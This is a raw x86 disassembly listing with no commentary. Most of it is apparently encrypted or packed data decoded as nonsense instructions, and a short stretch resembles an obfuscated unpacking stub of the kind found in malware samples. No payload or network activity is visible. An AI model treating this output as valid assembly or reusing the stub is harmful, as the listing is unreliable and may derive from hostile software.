  40310c:	stos   DWORD PTR es:[edi],eax
  40310d:	jg     0x403095
  40310f:	mov    bh,0x1b
  403111:	adc    eax,0x1ac4f5a2
  403116:	jecxz  0x403197
  403118:	dec    ebx
  403119:	stos   BYTE PTR es:[edi],al
  40311a:	pop    ds
  40311b:	xor    al,0x75
  40311d:	or     DWORD PTR [edi+0x4b],esp
  403120:	cmp    BYTE PTR ds:[ecx+0x3c2a74fc],dl
  403127:	and    eax,0xdbd2422c
  40312c:	test   al,0x8
  40312e:	out    0xb4,al
  403130:	or     eax,0x78e2506d
  403135:	int3   
  403136:	loop   0x4030f9
  403138:	mov    cl,0xf
  40313a:	sub    esi,DWORD PTR [ebp-0x72]
  40313d:	mov    bl,0x88
  40313f:	add    DWORD PTR [edx],ebp
  403141:	jle    0x4030e8
  403143:	es js  0x40313c
  403146:	loope  0x403148
  403148:	in     al,0x24
  40314a:	jecxz  0x403127
  40314c:	fst    QWORD PTR [ecx+0x7ffb3849]
  403152:	stc    
  403153:	pop    esi
  403154:	and    eax,0x722a8a26
  403159:	push   ds
  40315a:	jae    0x403102
  40315c:	sub    DWORD PTR [edx-0x767968bb],0x58
  403163:	pop    es
  403164:	test   ebp,ebx
  403166:	xor    edi,edx
  403168:	popf   
  403169:	es push ecx
  40316b:	mov    cl,0xf6
  40316d:	popa   
  40316e:	mov    bh,0x42
  403170:	sub    al,0x14
  403172:	shl    dl,0xe1
  403175:	inc    edx
  403176:	not    DWORD PTR [eax+0x2330bc42]
  40317c:	aas    
  40317d:	in     eax,0x47
  40317f:	lea    esi,ds:0x8b8c97f4
  403185:	scas   al,BYTE PTR es:[edi]
  403186:	or     BYTE PTR [ebp-0x5c],cl
  403189:	mov    bl,0xc8
  40318b:	mov    edx,0x11f912f2
  403190:	ins    BYTE PTR es:[edi],dx
  403191:	sub    ebp,edi
  403193:	aas    
  403194:	mov    esp,0xccb9f095
  403199:	test   BYTE PTR [eax-0x34],ch
  40319c:	cld    
  40319d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40319e:	pusha  
  40319f:	or     al,0xbd
  4031a1:	and    cl,bh
  4031a3:	mov    dh,0xf
  4031a5:	es xchg ebp,ecx
  4031a8:	and    al,0x4f
  4031aa:	dec    edi
  4031ab:	jno    0x4031e8
  4031ad:	xlat   BYTE PTR ds:[ebx]
  4031ae:	xchg   ebx,eax
  4031af:	mov    ch,0xf8
  4031b1:	adc    BYTE PTR [ebp-0x3915881a],dl
  4031b7:	sub    BYTE PTR [edi-0x76],ch
  4031ba:	out    dx,al
  4031bb:	imul   ecx,DWORD PTR [eax+0xd],0xa5949044
  4031c2:	(bad)  
  4031c3:	pop    esi
  4031c4:	xchg   ebx,eax
  4031c5:	jecxz  0x403175
  4031c7:	dec    edi
  4031c8:	adc    ch,ch
  4031ca:	adc    eax,0xd061098a
  4031cf:	pop    ebx
  4031d0:	add    ebx,DWORD PTR [eax]
  4031d2:	pop    edi
  4031d3:	mov    ds:0x4700c3a,eax
  4031d8:	xor    DWORD PTR [edx-0x22],0x43
  4031dc:	xchg   ecx,eax
  4031dd:	and    ebp,DWORD PTR [eax-0x4b]
  4031e0:	inc    ebx
  4031e1:	pop    esi
  4031e2:	cmc    
  4031e3:	nop
  4031e4:	ret    0xb59e
  4031e7:	ret    0x4b9c
  4031ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031eb:	xchg   edx,eax
  4031ec:	stc    
  4031ed:	retf   0x66e2
  4031f0:	rol    DWORD PTR [ecx],cl
  4031f2:	or     eax,0x34e56bd3
  4031f7:	cdq    
  4031f8:	fbstp  TBYTE PTR [ecx+ebx*4]
  4031fb:	push   ss
  4031fc:	push   0xffffffe5
  4031fe:	mov    ebx,ds
  403200:	pop    ebp
  403201:	xchg   ebx,eax
  403202:	push   cs
  403203:	jmp    0x5b43ba62
  403208:	push   edi
  403209:	push   edi
  40320a:	aaa    
  40320b:	dec    ebx
  40320c:	loopne 0x4031f7
  40320e:	imul   ecx,DWORD PTR [eax-0x7ee3dd4f],0x6a95448f
  403218:	in     eax,dx
  403219:	cld    
  40321a:	shl    BYTE PTR [ecx-0x1f],1
  40321d:	jns    0x4031c1
  40321f:	fld    st(2)
  403221:	fwait
  403222:	pop    ebp
  403223:	push   eax
  403224:	mov    bh,0xda
  403226:	and    eax,0xc284f72f
  40322b:	dec    ebp
  40322c:	gs mov ebx,esi
  40322f:	shl    ah,cl
  403231:	jmp    0x2d3dfed3
  403236:	pop    dx
  403238:	int    0xfd
  40323a:	(bad)  
  40323b:	and    BYTE PTR [ebp+ebp*2+0xce89d51],bl
  403242:	cmp    cl,BYTE PTR ds:0xa5286b97
  403248:	out    dx,al
  403249:	repnz push cs
  40324b:	cmp    al,al
  40324d:	adc    DWORD PTR [edi+0x1d27d022],edx
  403253:	ins    BYTE PTR es:[edi],dx
  403254:	push   edi
  403255:	push   0x10
  403257:	cwde   
  403258:	std    
  403259:	mov    DWORD PTR ds:0x9785372b,esi
  40325f:	mov    eax,ds:0x3154ab0
  403264:	mov    bl,0x76
  403266:	dec    ecx
  403267:	sub    al,0x10
  403269:	scas   al,BYTE PTR es:[edi]
  40326a:	mov    dl,BYTE PTR [edx+0x14cc34b8]
  403270:	mov    BYTE PTR [eax-0x7e],bh
  403273:	inc    eax
  403274:	add    BYTE PTR [ebx-0x2a2ed072],bl
  40327a:	push   ebp
  40327b:	adc    DWORD PTR [ebx-0x32],ebp
  40327e:	mov    BYTE PTR [ebx],cl
  403280:	cmp    BYTE PTR [ecx-0x30],ch
  403283:	add    DWORD PTR [eax+eax*4],edx
  403286:	das    
  403287:	outs   dx,BYTE PTR ds:[esi]
  403288:	js     0x4032e8
  40328a:	bswap  edx
  40328c:	add    DWORD PTR [esi],eax
  40328e:	and    cl,cl
  403290:	addr16 dec ebp
  403292:	dec    eax
  403293:	icebp  
  403294:	pusha  
  403295:	jns    0x4032fe
  403297:	add    BYTE PTR [edx],dl
  403299:	push   ecx
  40329a:	fiadd  WORD PTR [edx-0x23]
  40329d:	fsub   DWORD PTR [ebx-0x26f1819f]
  4032a3:	mov    dh,0x4b
  4032a5:	pusha  
  4032a6:	arpl   WORD PTR [ebx-0x7b],sp
  4032a9:	mov    dl,0x7d
  4032ab:	or     DWORD PTR [ebx+0x36],0xffffffef
  4032af:	xchg   edi,eax
  4032b0:	iret   
  4032b1:	adc    ebx,esi
  4032b3:	jo     0x4032df
  4032b5:	call   0x6040:0x2a8152be
  4032bc:	and    al,dl
  4032be:	les    esi,FWORD PTR ds:0x1d0806ba
  4032c4:	rep lods al,BYTE PTR ds:[esi]
  4032c6:	jno    0x3506262
  4032cc:	dec    ebx
  4032cd:	push   edx
  4032ce:	fsub   QWORD PTR [ebp-0x67]
  4032d1:	repnz xor al,0x5d
  4032d4:	nop
  4032d5:	out    dx,eax
  4032d6:	les    ebp,FWORD PTR [edi+0x48]
  4032d9:	clc    
  4032da:	xchg   edi,eax
  4032db:	ret    
  4032dc:	out    0x1c,eax
  4032de:	push   0xffffff90
  4032e0:	pop    edi
  4032e1:	sbb    ebx,DWORD PTR [ecx-0x52]
  4032e4:	cmp    BYTE PTR [ecx+ebx*2+0xb7490ae],0x58
  4032ec:	es pop ebp
  4032ee:	xlat   BYTE PTR ds:[ebx]
  4032ef:	fidivr DWORD PTR [edx-0x12]
  4032f2:	ins    BYTE PTR es:[edi],dx
  4032f3:	outs   dx,BYTE PTR ds:[esi]
  4032f4:	jmp    0x76e6:0x2205a5dc
  4032fb:	in     al,0x99
  4032fd:	out    0xd3,eax
  4032ff:	jbe    0x40333e
  403301:	xchg   ebx,eax
  403302:	jmp    0xa4a6:0x97b68e2
  403309:	pusha  
  40330a:	sub    eax,0x432b2cd3
  40330f:	jecxz  0x403387
  403311:	pop    eax
  403312:	add    esi,eax
  403314:	test   DWORD PTR [ebx+0x30],edi
  403317:	inc    edx
  403318:	call   0xc202:0x9fdcd760
  40331f:	ror    DWORD PTR [esi+0x5a],1
  403322:	aas    
  403323:	(bad)  
  403324:	xchg   ebp,eax
  403325:	push   es
  403326:	loop   0x4032d4
  403328:	mov    ebp,edx
  40332a:	cli    
  40332b:	shl    DWORD PTR [ecx-0x5fbdcace],cl
  403331:	mov    bl,0xdc
  403333:	retf   
  403334:	jne    0x4032dc
  403336:	popf   
  403337:	mov    cl,0xab
  403339:	sbb    eax,0xf2b35bed
  40333e:	jl     0x4033ae
  403340:	(bad)  [eax-0x32]
  403343:	mov    ebp,0x66ea0401
  403348:	sub    eax,0x1603cff5
  40334d:	ds rcr al,0x69
  403351:	push   ecx
  403352:	mov    cl,0xd4
  403354:	lods   eax,DWORD PTR ds:[esi]
  403355:	push   edi
  403356:	dec    edi
  403357:	ss in  eax,dx
  403359:	xor    al,0xf9
  40335b:	aam    0x1e
  40335d:	pusha  
  40335e:	imul   ebp,DWORD PTR cs:[eax-0x24f17589],0xc5ca7cb6
  403369:	pop    ecx
  40336a:	push   ss
  40336b:	cwde   
  40336c:	fiadd  WORD PTR [esi+ecx*1]
  40336f:	rol    ecx,0x72
  403372:	add    al,0x7c
  403374:	mov    cl,0x4e
  403376:	fdivr  DWORD PTR [eax-0x2b76f03b]
  40337c:	xchg   esi,eax
  40337d:	mov    edi,DWORD PTR [esi]
  40337f:	adc    dl,BYTE PTR [esi-0x43072c83]
  403385:	stos   DWORD PTR es:[edi],eax
  403386:	mov    ebp,0x67d5b68f
  40338b:	ds adc ecx,ebp
  40338e:	outs   dx,DWORD PTR ds:[esi]
  40338f:	pop    ss
  403390:	jg     0x40340a
  403392:	in     eax,0xa3
  403394:	add    al,al
  403396:	jecxz  0x403395
  403398:	mov    eax,0x758b9ae8
  40339d:	or     BYTE PTR [edi],cl
  40339f:	scas   eax,DWORD PTR es:[edi]
  4033a0:	cli    
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	cmp    ebp,DWORD PTR [ebp+0x143a5621]
  4033bf:	jo     0x403431
  4033c1:	mov    esi,0x4670707e
  4033c6:	or     al,BYTE PTR [ecx-0x1f3496a4]
  4033cc:	dec    edx
  4033cd:	sbb    al,0xb2
  4033cf:	retf   
  4033d0:	dec    esi
  4033d1:	xor    ah,cl
  4033d3:	sub    bl,BYTE PTR [edi+0x1c]
  4033d6:	aam    0x92
  4033d8:	mov    edx,0xe96cf55
  4033dd:	into   
  4033de:	push   es
  4033df:	xchg   DWORD PTR [ecx+0x8],edx
  4033e2:	and    DWORD PTR [edi+0x62afffd9],0x2e693615
  4033ec:	out    dx,al
  4033ed:	jo     0x403459
  4033ef:	xor    DWORD PTR [eax],esi
  4033f1:	imul   edx,DWORD PTR [ebp-0x7fc6bfa3],0x72
  4033f8:	xchg   ecx,eax
  4033f9:	in     al,0xd2
  4033fb:	sbb    eax,DWORD PTR [ecx-0x7600e439]
  403401:	or     BYTE PTR [edx],bl
  403403:	aas    
  403404:	pop    edi
  403405:	es mov al,0xcd
  403408:	sbb    eax,0xe7b25c2a
  40340d:	ja     0x4033ff
  40340f:	aad    0xe9
  403411:	mov    ds:0x43d9c2b,eax
  403416:	int    0xf2
  403418:	mov    bh,0x7b
  40341a:	jge    0x4033cd
  40341c:	xor    eax,0x60257574
  403421:	or     bl,dl
  403423:	je     0x403406
  403425:	add    BYTE PTR ss:[ebp+ebx*8-0x2b],al
  40342a:	xor    esi,ebx
  40342c:	call   0x8d21:0x9d8f18e1
  403433:	outs   dx,DWORD PTR ds:[esi]
  403434:	test   eax,0x7a0f8edb
  403439:	sahf   
  40343a:	(bad)  
  40343b:	jns    0x4033ea
  40343d:	arpl   WORD PTR [ecx-0x66f1fbd3],di
  403443:	icebp  
  403444:	pop    eax
  403445:	fmul   DWORD PTR [ebx]
  403447:	jno    0x403456
  403449:	mov    edi,0xd7b973a0
  40344e:	in     al,dx
  40344f:	int    0x4c
  403451:	jp     0x403425
  403453:	(bad)  
  403454:	cld    
  403455:	and    al,0xf7
  403457:	pop    ebp
  403458:	dec    esi
  403459:	fisttp QWORD PTR [ebp-0x5a7c02f1]
  40345f:	adc    esi,DWORD PTR [esi]
  403461:	outs   dx,DWORD PTR ds:[esi]
  403462:	xchg   ebx,eax
  403463:	xchg   esp,eax
  403464:	xchg   edx,eax
  403465:	js     0x403458
  403467:	and    eax,DWORD PTR [ebp+0x75a0abb8]
  40346d:	mov    ds:0x65139bca,al
  403472:	jno    0x4034aa
  403474:	ins    DWORD PTR es:[edi],dx
  403475:	push   ss
  403476:	(bad)  
  403477:	jnp    0x40348f
  403479:	dec    esi
  40347a:	mov    ds:0xba27dc91,al
  40347f:	xchg   BYTE PTR [eax-0x4a],ch
  403482:	stc    
  403483:	addr16 lock jnp 0x40342d
  403487:	sti    
  403488:	pop    es
  403489:	test   al,0x26
  40348b:	retf   0x3887
  40348e:	je     0x40344b
  403490:	inc    edi
  403491:	xchg   BYTE PTR [ebx],bh
  403493:	into   
  403494:	pop    ds
  403495:	xor    edx,DWORD PTR [ebx+edx*8]
  403498:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403499:	or     DWORD PTR [esi-0x29],ecx
  40349c:	jp     0x40348e
  40349e:	pop    eax
  40349f:	lds    ebx,FWORD PTR ss:[ecx-0x2faaec1f]
  4034a6:	das    
  4034a7:	(bad)  
  4034a8:	loop   0x40348f
  4034aa:	into   
  4034ab:	es mov dl,0x49
  4034ae:	stos   BYTE PTR es:[edi],al
  4034af:	dec    ebx
  4034b0:	xlat   BYTE PTR ds:[ebx]
  4034b1:	add    al,0xe2
  4034b3:	out    0x0,al
  4034b5:	sbb    eax,0xf02ba45c
  4034ba:	xor    esi,eax
  4034bc:	mov    eax,0x1b6eaab1
  4034c1:	or     eax,0x88286a39
  4034c6:	adc    bh,ah
  4034c8:	cmp    edx,ecx
  4034ca:	xchg   ebp,eax
  4034cb:	lods   al,BYTE PTR ds:[esi]
  4034cc:	ja     0x4034fb
  4034ce:	mov    ebp,0x9070cc06
  4034d3:	dec    esp
  4034d4:	into   
  4034d5:	sbb    DWORD PTR [ecx+0x44],eax
  4034d8:	jle    0x403461
  4034da:	ins    DWORD PTR es:[edi],dx
  4034db:	mov    al,0x2b
  4034dd:	(bad)  
  4034de:	es pop ecx
  4034e0:	pop    ss
  4034e1:	bnd jnp 0x403535
  4034e4:	lea    edx,[ecx+0x7d]
  4034e7:	in     al,0x58
  4034e9:	add    ebp,edi
  4034eb:	push   eax
  4034ec:	not    DWORD PTR [edx+0x2]
  4034ef:	pop    eax
  4034f0:	push   esp
  4034f1:	jbe    0x403501
  4034f3:	(bad)  
  4034f4:	sbb    ch,BYTE PTR [ebp+0x3b]
  4034f7:	inc    edx
  4034f8:	lock cmp ebx,eax
  4034fb:	adc    ebx,DWORD PTR [eax-0x5c]
  4034fe:	lods   al,BYTE PTR ds:[esi]
  4034ff:	aas    
  403500:	cmp    eax,0x94c72f79
  403505:	mov    al,ds:0xb73bbb65
  40350a:	fsubr  QWORD PTR [ebx-0x2283f46a]
  403510:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403511:	jae    0x4034b1
  403513:	mov    ebx,0x3247b328
  403518:	ret    0xe22a
  40351b:	push   esi
  40351c:	test   al,0x2d
  40351e:	data16 mov bl,0x72
  403521:	and    ebx,0xe12f4be4
  403527:	mov    dl,0xa6
  403529:	enter  0x1957,0x13
  40352d:	out    0x51,eax
  40352f:	mov    cs,esp
  403531:	push   ss
  403532:	out    dx,al
  403533:	stos   DWORD PTR es:[edi],eax
  403534:	mov    BYTE PTR [edx+0x8],dl
  403537:	cld    
  403538:	das    
  403539:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40353a:	lea    ebx,[eax-0x70]
  40353d:	pop    es
  40353e:	shl    BYTE PTR [ebx+esi*2+0x34],1
  403542:	xchg   ebp,eax
  403543:	inc    edx
  403544:	test   al,0xca
  403546:	adc    edx,DWORD PTR ds:[ebx]
  403549:	pop    eax
  40354a:	pmulhuw mm7,QWORD PTR [ecx+0x6d8d397d]
  403551:	cs das 
  403553:	stc    
  403554:	adc    BYTE PTR [ebx],al
  403556:	dec    ebp
  403557:	push   esp
  403558:	ins    DWORD PTR es:[edi],dx
  403559:	dec    esi
  40355a:	hlt    
  40355b:	pop    esi
  40355c:	mov    ecx,0xf4093509
  403561:	sbb    al,0x66
  403563:	shl    BYTE PTR [edx-0x64],0xaa
  403567:	xchg   edx,eax
  403568:	push   ebp
  403569:	and    edx,DWORD PTR ds:0xbb84a2c
  40356f:	les    esi,FWORD PTR [edx]
  403571:	pushf  
  403572:	jno    0x403581
  403574:	in     eax,0x4d
  403576:	xor    DWORD PTR [eax+0x2b],ebp
  403579:	mov    dl,0xd8
  40357b:	mov    ch,0xac
  40357d:	pop    edi
  40357e:	test   esp,edx
  403580:	ror    ah,0xca
  403583:	jno    0x4035aa
  403585:	sbb    ebp,DWORD PTR [ebx]
  403587:	inc    esp
  403588:	mov    eax,0x2813bce0
  40358d:	jnp    0x403554
  40358f:	push   ss
  403590:	xor    BYTE PTR [edi+0x2dded987],0xeb
  403597:	daa    
  403598:	test   DWORD PTR [esi-0x5f],eax
  40359b:	sub    edi,DWORD PTR [ecx]
  40359d:	dec    edx
  40359e:	xor    edx,DWORD PTR [esi*4-0x59a35c4d]
  4035a5:	cmp    DWORD PTR [esi+0x4f],ebx
  4035a8:	xor    BYTE PTR [edi-0x5d36c4ae],dh
  4035ae:	(bad)  
  4035af:	mov    edi,edi
  4035b1:	adc    BYTE PTR [ebp+0x4f6eb233],al
  4035b7:	mov    esi,0x37c0007d
  4035bc:	cmp    DWORD PTR ds:0x44458de4,eax
  4035c2:	(bad)  
  4035c3:	ror    BYTE PTR [ebx-0x7ab22de2],0xc9
  4035ca:	push   edi
  4035cb:	pop    esi
  4035cc:	cmp    bl,BYTE PTR ds:0xbb716382
  4035d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035d3:	fdivr  st(6),st
  4035d5:	ins    DWORD PTR es:[edi],dx
  4035d6:	or     eax,0x3c675fbf
  4035db:	cmp    esp,esi
  4035dd:	cli    
  4035de:	clc    
  4035df:	inc    ebp
  4035e0:	cmp    BYTE PTR [edi+0x28b041ce],0x37
  4035e7:	out    0x49,al
  4035e9:	sub    BYTE PTR [esi+0x72b6137f],dl
  4035ef:	out    0x81,al
  4035f1:	bound  ebp,QWORD PTR [eax]
  4035f3:	mov    eax,0xa434eb4
  4035f8:	sbb    BYTE PTR [edx+0x7ab197a5],bh
  4035fe:	xchg   ebp,eax
  4035ff:	xor    ecx,0x2c72ba0f
  403605:	retf   0xd317
  403608:	stos   BYTE PTR es:[edi],al
  403609:	xchg   ebp,eax
  40360a:	sbb    dh,BYTE PTR [edx-0x34]
  40360d:	jmp    0x1301056d
  403612:	push   ds
  403613:	or     eax,0x936f8dd6
  403618:	and    DWORD PTR [esi],edi
  40361a:	sbb    bh,BYTE PTR [esi+ecx*2]
  40361d:	in     al,dx
  40361e:	ins    BYTE PTR es:[edi],dx
  40361f:	sub    al,0x4c
  403621:	pop    esp
  403622:	das    
  403623:	mov    dh,0x52
  403625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403626:	sbb    BYTE PTR [ebx],0x6e
  403629:	mov    ecx,0x67c979ba
  40362e:	dec    edx
  40362f:	jp     0x4035be
  403631:	push   ebx
  403632:	shl    DWORD PTR [esi-0x6b],cl
  403635:	sub    DWORD PTR ss:[ebp+ecx*8-0x4c],edx
  40363a:	push   eax
  40363b:	fidiv  DWORD PTR [esi]
  40363d:	jg     0x4035f7
  40363f:	mov    dl,0x75
  403641:	retf   0xffb4
  403644:	jecxz  0x40360f
  403646:	pop    esi
  403647:	xor    al,0xc9
  403649:	clc    
  40364a:	mov    ebx,0x2b3e635a
  40364f:	repnz aam 0xee
  403652:	cli    
  403653:	loop   0x40369b
  403655:	aas    
  403656:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  403658:	out    dx,al
  403659:	lahf   
  40365a:	sbb    DWORD PTR [edx+0x6c],edx
  40365d:	sahf   
  40365e:	mov    dl,0x90
  403660:	add    BYTE PTR [ebx-0x40],ch
  403663:	pop    eax
  403664:	xor    ah,cl
  403666:	ret    0x937e
  403669:	aam    0xa4
  40366b:	into   
  40366c:	add    edx,esi
  40366e:	mov    ecx,0xf74ae615
  403673:	or     eax,0xfc852d64
  403678:	mov    edx,0x1cb96b4
  40367d:	pusha  
  40367e:	add    eax,0xdce0668b
  403683:	dec    ebp
  403684:	ficom  WORD PTR [edx+0x3848a8c]
  40368a:	pushf  
  40368b:	jb     0x4036bf
  40368d:	add    BYTE PTR [eax+0x458b3704],cl
  403693:	cld    
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fd6d,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fd6d,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fd6d,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e357
  4036fc:	cmp    DWORD PTR ds:0x42fd6d,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fd6d
  403711:	dec    eax
  403712:	mov    ds:0x42fd6d,eax
  403717:	mov    eax,ds:0x42fd6d
  40371c:	dec    eax
  40371d:	mov    ds:0x42fd6d,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e773,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e777,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fd8d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e793,0x42e19c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fdfa,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e1a4,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e78f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    DWORD PTR [ebx+0x781ba80a],esp
  4037a6:	adc    DWORD PTR [eax+0x70],esi
  4037a9:	cmp    eax,0x270707d
  4037ae:	push   cs
  4037af:	pop    esi
  4037b0:	shl    ah,0x66
  4037b3:	sub    esp,DWORD PTR [edi+0x59]
  4037b6:	je     0x40379c
  4037b8:	add    BYTE PTR [ecx+0x2c],ah
  4037bb:	ret    0x9b67
  4037be:	pop    esp
  4037bf:	out    dx,eax
  4037c0:	in     al,dx
  4037c1:	pop    esp
  4037c2:	dec    edi
  4037c3:	iret   
  4037c4:	cmc    
  4037c5:	pop    DWORD PTR [ebp-0x5320607d]
  4037cb:	aad    0x87
  4037cd:	add    dh,BYTE PTR [edi-0x59]
  4037d0:	adc    DWORD PTR [edi],ebp
  4037d2:	xchg   esi,eax
  4037d3:	loopne 0x4037a7
  4037d5:	jge    0x4037e9
  4037d7:	pop    ebp
  4037d8:	fistp  DWORD PTR [edi+ebx*1-0x12]
  4037dc:	and    dl,BYTE PTR [edi-0x3d09eda8]
  4037e2:	xchg   edi,eax
  4037e3:	fldenv [edi-0x7bf91338]
  4037e9:	sbb    DWORD PTR [esi-0x776b979a],0x71
  4037f0:	dec    eax
  4037f1:	sub    DWORD PTR [edi],0x5
  4037f4:	add    al,0xad
  4037f6:	aas    
  4037f7:	ror    DWORD PTR [ebx-0xb868a39],0xd2
  4037fe:	sti    
  4037ff:	jl     0x403857
  403801:	imul   ebp,DWORD PTR [ecx+0x2],0xbecf18db
  403808:	sub    dl,BYTE PTR [eax-0x62]
  40380b:	cmp    ebp,ebp
  40380d:	sbb    ebx,DWORD PTR [edi+0x1f29e001]
  403813:	xchg   ecx,eax
  403814:	or     DWORD PTR [edi+edx*1-0x1d],esi
  403818:	(bad)  
  40381c:	push   esi
  40381d:	xlat   BYTE PTR ds:[ebx]
  40381e:	sub    DWORD PTR [edx+ebp*2],eax
  403821:	inc    ecx
  403822:	inc    edi
  403823:	pop    edi
  403824:	cli    
  403825:	xchg   edx,eax
  403826:	ret    0x73d8
  403829:	stos   DWORD PTR es:[edi],eax
  40382a:	ss (bad) 
  40382d:	jne    0x4037de
  40382f:	or     eax,0x2bbb0b61
  403834:	jp     0x403851
  403836:	pop    eax
  403837:	mov    bh,0xf9
  403839:	out    dx,al
  40383a:	leave  
  40383b:	adc    bh,BYTE PTR [edi-0x58]
  40383e:	cs and al,0xb9
  403841:	lods   al,BYTE PTR ds:[esi]
  403842:	loop   0x4037c9
  403844:	mov    eax,0xe2242a6d
  403849:	outs   dx,BYTE PTR ds:[esi]
  40384a:	(bad)  
  40384b:	mov    esp,0x872cb2b8
  403850:	les    esp,FWORD PTR [ebx-0x734e4aa8]
  403856:	jmp    0x40388c
  403858:	and    dl,ah
  40385a:	mov    ebx,0x4e9ae754
  40385f:	xchg   DWORD PTR [edi-0x57fddeb2],ecx
  403865:	sub    al,0xde
  403867:	push   0xffffffb2
  403869:	push   ebp
  40386a:	jns    0x4038a7
  40386c:	rcr    edi,0x2a
  40386f:	mov    ch,0x7c
  403871:	and    edi,esp
  403873:	(bad)  
  403874:	xor    eax,DWORD PTR [ebx+0x86fbfa1]
  40387a:	inc    ebx
  40387b:	dec    edi
  40387c:	mov    ch,0x6f
  40387e:	fistp  DWORD PTR [ebx]
  403880:	jnp    0x403845
  403882:	fdivr  DWORD PTR [ebp+eiz*1+0x2b]
  403886:	out    0xe9,al
  403888:	fistp  WORD PTR [ebx-0x12]
  40388b:	imul   ecx,DWORD PTR [esi-0x4],0xa9bc7084
  403892:	or     BYTE PTR [ebp+eiz*1-0x9155c5d],ch
  403899:	out    0xbc,al
  40389b:	mov    eax,ds:0x564c5a
  4038a0:	iret   
  4038a1:	jnp    0x4038df
  4038a3:	add    dh,BYTE PTR [edi-0x6f]
  4038a6:	dec    edx
  4038a7:	and    BYTE PTR [eax-0x7e],ah
  4038aa:	loope  0x4038fe
  4038ac:	dec    BYTE PTR [eax-0x20b4d8b2]
  4038b2:	into   
  4038b3:	(bad)  
  4038b4:	(bad)
  4038b8:	jb     0x4038bc
  4038ba:	cmp    BYTE PTR [esi+0x74],bl
  4038bd:	ins    BYTE PTR es:[edi],dx
  4038be:	push   ss
  4038bf:	data16 mov al,0x4f
  4038c2:	ret    0x670d
  4038c5:	xchg   esp,eax
  4038c6:	cmp    dh,BYTE PTR [ebp-0x73d1c79d]
  4038cc:	ret    
  4038cd:	jo     0x403932
  4038cf:	out    0xc1,eax
  4038d1:	jns    0x40388f
  4038d3:	push   ebx
  4038d4:	inc    eax
  4038d5:	adc    esp,DWORD PTR [esi+0x2f93073c]
  4038db:	fld    st(5)
  4038dd:	out    dx,al
  4038de:	jae    0x4038ef
  4038e0:	out    dx,eax
  4038e1:	xor    DWORD PTR [edx+0x25],0xe
  4038e5:	popa   
  4038e6:	and    ch,BYTE PTR [ecx+0x55e70cf9]
  4038ec:	mov    bl,0x5
  4038ee:	xor    BYTE PTR [edi+0x278ae54c],cl
  4038f4:	mov    ecx,0x882df928
  4038f9:	retf   0x7c99
  4038fc:	fwait
  4038fd:	dec    edx
  4038fe:	lds    eax,FWORD PTR [esp-0x22]
  403902:	and    eax,0x96b7251c
  403907:	sbb    al,0x23
  403909:	inc    ebp
  40390a:	outs   dx,DWORD PTR ds:[si]
  40390c:	xchg   DWORD PTR [esi],eax
  40390e:	xor    dl,dh
  403910:	jb     0x403950
  403912:	in     al,dx
  403913:	cdq    
  403914:	xchg   edx,eax
  403915:	aad    0xcc
  403917:	xchg   esi,eax
  403918:	or     DWORD PTR [esi+0x635e1249],0xe744511a
  403922:	jo     0x403947
  403924:	inc    esp
  403925:	jg     0x4038ed
  403927:	scas   al,BYTE PTR es:[edi]
  403928:	scas   eax,DWORD PTR es:[edi]
  403929:	mov    eax,0xff066854
  40392e:	mov    ebp,0xc137defc
  403933:	push   ebp
  403934:	xor    ebp,DWORD PTR [edx+0x38]
  403937:	aas    
  403938:	inc    ebx
  403939:	fistp  QWORD PTR [edx-0x51]
  40393c:	icebp  
  40393d:	add    BYTE PTR [edi-0x43183960],bh
  403943:	xchg   dh,cl
  403945:	sbb    DWORD PTR [edi-0x45],esi
